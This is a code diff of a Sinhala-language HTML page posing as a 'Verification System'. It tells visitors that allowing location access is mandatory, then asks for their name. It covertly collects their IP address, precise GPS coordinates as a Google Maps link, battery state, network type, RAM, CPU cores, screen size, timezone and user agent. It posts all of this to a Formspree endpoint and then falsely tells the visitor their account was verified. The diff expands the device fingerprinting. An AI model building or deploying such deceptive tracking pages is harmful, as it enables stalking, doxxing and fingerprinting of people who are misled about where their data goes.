@@ -3,16 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Verification System</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
-        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 20px; }
-        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; display: none; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; background-color: #28a745; color: white; display: none; }
-        button:hover { background-color: #218838; }
-        #status { margin-top: 15px; font-size: 14px; color: #606770; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; display: block; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 380px; }
+        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 22px; }
+        p { color: #606770; font-size: 14px; line-height: 1.5; }
+        input[type="text"] { width: 100%; padding: 12px; margin: 20px 0; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; display: none; transition: 0.3s; }
+        input[type="text"]:focus { border-color: #28a745; outline: none; box-shadow: 0 0 5px rgba(40, 167, 69, 0.3); }
+        button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; background-color: #28a745; color: white; display: none; }
+        button:hover { background-color: #218838; transform: translateY(-1px); }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        #status { margin-top: 15px; font-size: 14px; color: #d9534f; font-weight: 500; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 15px; display: block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -23,49 +26,72 @@
         <div id="loading-ui">
             <div class="loader"></div>
             <h2>පිටුව සකසමින් පවතී...</h2>
-            <p id="status">කරුණාකර ඉහළින් එන Location අවසරය (Allow) ලබා දෙන්න.</p>
+            <p>ඉදිරියට යාමට ඉහළින් එන <b>Location Permission</b> එක <b>Allow</b> කරන්න.</p>
         </div>
 
         <div id="input-ui">
             <h2>තොරතුරු තහවුරු කරන්න</h2>
-            <input type="text" id="userName" placeholder="ඔබේ නම මෙතන ටයිප් කරන්න...">
+            <p>පද්ධතියට ඇතුළු වීමට ඔබේ නම ඇතුළත් කරන්න.</p>
+            <input type="text" id="userName" placeholder="ඔබේ නම මෙතන ලියන්න...">
             <button id="submitBtn" onclick="sendToEmail()">ඉදිරියට යන්න</button>
         </div>
+        
+        <div id="status"></div>
     </div>
 </div>
 
 <script>
-    let capturedData = {
-        ip: "නොදනී",
-        location: "අවසර දී නැත",
-        time: ""
+    // සියලුම දත්ත ගබඩා කරන Object එක
+    let techData = {
+        ip: "Unknown",
+        location: "Denied",
+        time: "",
+        battery: "Unknown",
+        network: "Unknown",
+        ram: "Unknown",
+        cpu: "Unknown",
+        screen: window.screen.width + "x" + window.screen.height,
+        lang: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine ? "Yes" : "No"
     };
 
     async function autoGetLocation() {
-        // 1. IP එක ලබා ගැනීම
+        // 1. IP ලිපිනය ලබා ගැනීම
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            capturedData.ip = data.ip;
-            capturedData.time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
-        } catch (e) { 
-            console.log("IP fetch failed"); 
+            techData.ip = data.ip;
+            techData.time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
+        } catch (e) { console.log("IP fetch failed"); }
+
+        // 2. උපාංගයේ Hardware විස්තර
+        techData.cpu = (navigator.hardwareConcurrency || "Unknown") + " Cores";
+        techData.ram = (navigator.deviceMemory || "Unknown") + " GB";
+        techData.network = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+
+        // 3. බැටරි විස්තර (Fix)
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                techData.battery = (battery.level * 100).toFixed(0) + "% (" + (battery.charging ? "Charging" : "Not Charging") + ")";
+            } catch (e) { techData.battery = "Not Supported"; }
         }
 
-        // 2. Location අවසරය ඉල්ලීම (Page load එකේදීම)
+        // 4. Location ලබා ගැනීම (Critical Fix)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                // සිතියම් ලින්ක් එක නිවැරදිව සකස් කිරීම
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                capturedData.location = `https://www.google.com/maps?q=${lat},${lon}`;
+                // Google Maps URL එක නිවැරදි Template Literal එකක් ලෙස සැකසීම
+                techData.location = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // Location ලැබුණු පසු Name input එක පෙන්වීම
+                // UI එක මාරු කිරීම
                 document.getElementById("loading-ui").style.display = "none";
                 document.getElementById("userName").style.display = "block";
                 document.getElementById("submitBtn").style.display = "block";
             }, (err) => {
-                document.getElementById("status").innerHTML = "<b style='color:red'>දෝෂයකි: ඉදිරියට යාමට Location 'Allow' කිරීම අනිවාර්ය වේ. පේජ් එක Refresh කර නැවත උත්සාහ කරන්න.</b>";
+                document.getElementById("status").innerHTML = "දෝෂයකි: ඉදිරියට යාමට Location Allow කිරීම අනිවාර්ය වේ. කරුණාකර පේජ් එක Refresh කරන්න.";
                 document.querySelector(".loader").style.display = "none";
             }, { enableHighAccuracy: true });
         } else {
@@ -77,40 +103,46 @@
         const nameInput = document.getElementById("userName");
         const name = nameInput.value.trim();
         const btn = document.getElementById("submitBtn");
+        const statusDiv = document.getElementById("status");
 
         if (!name) {
             alert("කරුණාකර නම ඇතුළත් කරන්න.");
             return;
         }
 
-        btn.innerText = "යවමින් පවතී...";
+        btn.innerText = "දත්ත යවමින් පවතී...";
         btn.disabled = true;
+        statusDiv.innerHTML = "";
 
-        // 3. Formspree වෙත සියලු දත්ත යැවීම
         try {
             const response = await fetch("https://formspree.io/f/xdabkpao", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     Name: name,
-                    IP_Address: capturedData.ip,
-                    Time: capturedData.time,
-                    Google_Maps_Location: capturedData.location,
-                    Device_Info: navigator.userAgent
+                    IP_Address: techData.ip,
+                    Maps_Link: techData.location,
+                    Date_Time: techData.time,
+                    Battery_Status: techData.battery,
+                    Network_Type: techData.network,
+                    Screen_Size: techData.screen,
+                    RAM_Estimate: techData.ram,
+                    CPU_Cores: techData.cpu,
+                    TimeZone: techData.timezone,
+                    Online: techData.online,
+                    User_Agent: navigator.userAgent
                 })
             });
 
             if (response.ok) {
-                document.getElementById("content").innerHTML = "<h2 style='color:green'>සාර්ථකයි!</h2><p>ඔබේ තොරතුරු සාර්ථකව තහවුරු විය.</p>";
-                // අවශ්‍ය නම් සාර්ථක වූ පසු වෙනත් ලින්ක් එකකට යැවිය හැක:
-                // window.location.href = "https://google.com";
+                document.getElementById("content").innerHTML = "<h2 style='color:#28a745'>සාර්ථකයි!</h2><p>ඔබේ ගිණුම සාර්ථකව තහවුරු විය. ස්තූතියි.</p>";
             } else {
                 throw new Error("Formspree Error");
             }
         } catch (err) {
-            alert("දෝෂයකි. කරුණාකර නැවත උත්සාහ කරන්න.");
-            btn.innerText = "ඉදිරියට යන්න";
+            alert("දෝෂයක් සිදු විය. කරුණාකර නැවත උත්සාහ කරන්න.");
             btn.disabled = false;
+            btn.innerText = "ඉදිරියට යන්න";
         }
     }
 </script>
